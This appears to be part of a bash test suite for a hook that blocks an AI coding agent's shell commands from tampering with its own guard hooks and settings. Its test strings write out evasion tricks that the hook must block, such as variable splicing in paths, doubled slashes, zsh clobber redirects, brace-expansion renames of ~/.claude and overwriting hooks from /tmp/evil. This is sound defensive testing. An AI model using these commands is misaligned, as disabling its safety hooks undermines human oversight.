check ALLOW 'shasum core/hooks/validate-crew-bash.sh'
check ALLOW 'cmp core/hooks/validate-crew-bash.sh /tmp/deployed.sh'
check ALLOW 'sha256sum core/hooks/validate-crew-bash.sh'
check ALLOW 'nl core/hooks/validate-crew-bash.sh'
check ALLOW 'egrep -n exit core/hooks/validate-crew-bash.sh'

echo "=== (B) Fable r7 HIGH-1: git --output is a WRITE flag, not reader-equivalent (BLOCK) ==="
check BLOCK 'git diff --output=core/hooks/validate-crew-bash.sh'
check BLOCK 'git diff --output core/hooks/validate-crew-bash.sh'
check BLOCK 'git show --output=core/hooks/validate-crew-bash.sh HEAD'
check BLOCK 'git log --output=core/hooks/crew-allow-local.sh -1'
check ALLOW 'git show HEAD:core/hooks/validate-crew-bash.sh'
check ALLOW 'git diff core/hooks/validate-crew-bash.sh'

echo "=== (B) Fable r7 HIGH-2: parameter splice (empty/segment expansion) rejoins + arms (BLOCK) ==="
check BLOCK 'rm ~/.cla$1ude/hooks/*'
check BLOCK 'rm ~/.cla$@ude/hooks/*'
check BLOCK 'mv ~/.cla$1ude ~/.claude-off'
check BLOCK 'cat /dev/null > ~/.cla$1ude/hooks/validate-crew-bash$1.sh'
check BLOCK 'rm core$(echo $(echo $(echo)))/hooks/*.sh'
check BLOCK 'rm modules/substrate-integrity/sub${X}strate_tripwire.py'
# a legitimate $VAR path that does NOT resolve to substrate must still pass (no over-arm)
check ALLOW 'rm $BUILD/artifact.o'
check ALLOW 'cat $HOME/notes.txt'

echo "=== (B) Fable r7 HIGH-3: // and /./ path normalization (BLOCK) ==="
check BLOCK 'rm core//hooks/*.sh'
check BLOCK 'rm core/./hooks/*.sh'
check BLOCK 'rm modules/autonomous//hooks/*.sh'
check BLOCK 'chmod 000 core//hooks/*.sh'
check BLOCK 'echo core//hooks/g.sh | xargs -I{} cp /dev/null {}'

echo "=== (B) Fable r7 HIGH-4: zsh >! / >>! / &>! clobber-override redirects (BLOCK) ==="
check BLOCK 'cat /tmp/evil >! ~/.claude/hooks/ship-substrate-guard.sh'
check BLOCK 'cat /tmp/evil >! ~/.claude/settings.json'
check BLOCK 'cat /dev/null >>! core/hooks/validate-crew-bash.sh'
check BLOCK 'cat /tmp/evil &>! ~/.claude/hooks/validate-crew-bash.sh'
check BLOCK 'grep . /tmp/evil >! ~/.claude/agents/ship-crew.md'
# real &-redirects unaffected by the >! addition
check ALLOW 'grep pattern file 2>&1'
check ALLOW 'ls -la &> /tmp/out.txt'

echo "=== (B) Fable r8 A1: brace expansion arms (the backup/list idioms disable a guard) (BLOCK) ==="
check BLOCK 'mv core/hooks{,.bak}'
check BLOCK 'mv ~/.claude{,.bak}'
check BLOCK 'cp -r ~/.claude{,.bak}'
check BLOCK 'rm core/{hooks,agents}/*.sh'
check BLOCK 'mv modules/substrate-integrity{,.bak}'
check BLOCK 'rm modules/substrate-integrity/*.py'
# adopter brace idioms on non-substrate paths still pass
check ALLOW 'mv build/out{,.bak}'
check ALLOW 'rm build/{a,b}.o'
check ALLOW 'cp src/{a,b}.js /tmp/'

echo "=== (B) Fable r8 A6/A7: git branch copy/upstream + find -fls denied (BLOCK) ==="
check BLOCK 'git branch -C main main2'
check BLOCK 'git branch -c main main2'
check BLOCK 'git branch --copy main main2'
check BLOCK 'git branch -u origin/main'
check BLOCK 'find . -fls /tmp/x'
check ALLOW 'git branch -a'
check ALLOW 'git branch --list'

echo "=== (B) Fable r8 A8: git ls-files -o (=--others, a read) no longer false-blocked (ALLOW) ==="
check ALLOW 'git ls-files -o core/hooks'
check ALLOW 'git ls-files --others'
check BLOCK 'git diff --output=core/hooks/validate-crew-bash.sh'

# --- Fail-closed harness: varies raw stdin + PATH (the check() helper only varies the
#     command string, so it structurally cannot express these — 058 M3 / invariant 3 + L1). ---
check_stdin() {
  local expected="$1" input="$2" result
  if printf '%s' "$input" | bash "$HOOK" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  if [ "$result" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    printf "  FAIL: expected %-5s got %-5s  stdin=[%s]\n" "$expected" "$result" "$input"
    FAIL=$((FAIL + 1))
  fi
}

check_missing_tool() {
  local expected="$1" hide="$2" result tmpbin tp
  tmpbin=$(mktemp -d)
  local t
  for t in bash cat jq perl grep awk tr sed dirname head; do
    [ "$t" = "$hide" ] && continue
    tp=$(command -v "$t" 2>/dev/null) || continue
    ln -s "$tp" "$tmpbin/$t" 2>/dev/null || true
  done
  local json
  json=$(jq -n --arg cmd 'ls' '{"tool_input":{"command":$cmd}}')
  if echo "$json" | PATH="$tmpbin" bash "$HOOK" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  rm -rf "$tmpbin"
  if [ "$result" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    printf "  FAIL: expected %-5s got %-5s  (missing %s)\n" "$expected" "$result" "$hide"
    FAIL=$((FAIL + 1))
  fi
}

echo "=== 058 L1 / invariant 3: fail-closed on empty/malformed stdin + missing tooling (BLOCK) ==="
check_stdin BLOCK ''
check_stdin BLOCK 'not json at all'
check_stdin ALLOW '{"tool_input":{"command":"ls"}}'
check_stdin ALLOW '{"tool_input":{}}'
check_missing_tool BLOCK jq
check_missing_tool BLOCK perl

# --- A5 / A3 arming-depth (Nav ruling 2026-07-30) ---
# check_cwd: pass a session .cwd in the payload (the harness default omits it).
check_cwd() {  # $1=expected $2=cwd $3=cmd
  local expected="$1" cwd="$2" cmd="$3" json result
  json=$(jq -n --arg cmd "$cmd" --arg cwd "$cwd" '{"tool_input":{"command":$cmd},"cwd":$cwd}')
  if echo "$json" | bash "$HOOK" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  if [ "$result" = "$expected" ]; then PASS=$((PASS + 1)); else
    printf "  FAIL: expected %-5s got %-5s  (cwd=%s) %s\n" "$expected" "$result" "$cwd" "$cmd"; FAIL=$((FAIL + 1)); fi
}
# check_offlayout: invoke an OFF-LAYOUT copy of the guard (a `scripts/` install like the live
# ship) so the hard-coded `core/hooks` DIR literal cannot match — a BLOCK on a dir reference with
# NO protected basename proves arming derives from the hook's own resolved dir (A5). {DIR} → guard dir.
check_offlayout() {  # $1=expected $2=cmd-template
  local expected="$1" tmpl="$2" base d cmd json result
  base=$(mktemp -d); d="$base/scripts"; mkdir -p "$d"; cp "$HOOK" "$d/validate-crew-bash.sh"
  cmd=${tmpl//\{DIR\}/$d}
  json=$(jq -n --arg cmd "$cmd" '{"tool_input":{"command":$cmd}}')
  if echo "$json" | bash "$d/validate-crew-bash.sh" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  rm -rf "$base"
  if [ "$result" = "$expected" ]; then PASS=$((PASS + 1)); else
    printf "  FAIL: expected %-5s got %-5s  (off-layout) %s\n" "$expected" "$result" "$cmd"; FAIL=$((FAIL + 1)); fi
}

echo "=== A5 (Nav ruling): arming derives from the hook's own dir, not a core/hooks literal (off-layout, no protected basename) ==="
check_offlayout BLOCK 'rm {DIR}/*.sh'            # dir glob, no protected basename -> A5-only arm
check_offlayout BLOCK 'mv {DIR} {DIR}-old'       # rename the guard dir itself -> A5-only arm
check_offlayout BLOCK 'cp /dev/null {DIR}/x'     # write a non-protected file into the guard dir -> A5-only arm
check_offlayout BLOCK 'echo pwned > {DIR}/z'     # redirect a non-protected file into the guard dir -> A5-only arm
check_offlayout ALLOW 'ls {DIR}'                 # reader on the guard dir -> armed but allowed
check_offlayout ALLOW 'rm {DIR}-backup/x.txt'    # sibling dir sharing the prefix -> NOT over-armed

echo "=== A3 (Nav ruling, bounded): session cwd inside the guard dir arms a bare glob write ==="
HOOKDIR="$(cd "$(dirname "$HOOK")" && pwd)"
check_cwd BLOCK "$HOOKDIR" 'rm *.sh'                 # bare glob, no substrate text, but cwd IS the guard dir
check_cwd BLOCK "$HOOKDIR" 'mv * /tmp/'              # bare wildcard writer from inside the guard dir
check_cwd ALLOW "$HOOKDIR" 'cat foo.sh'              # reader from inside guard dir -> armed but allowed
check_cwd ALLOW "$HOME/code/myrepo" 'rm build/*.o'    # normal repo cwd -> NOT armed
check_cwd ALLOW "$HOOKDIR-other" 'rm *.sh'          # sibling cwd sharing the prefix -> NOT contained, NOT armed

echo ""
echo "---"
echo "Passed: $PASS  Failed: $FAIL"
[ "$FAIL" -eq 0 ] && echo "All tests passed." || exit 1
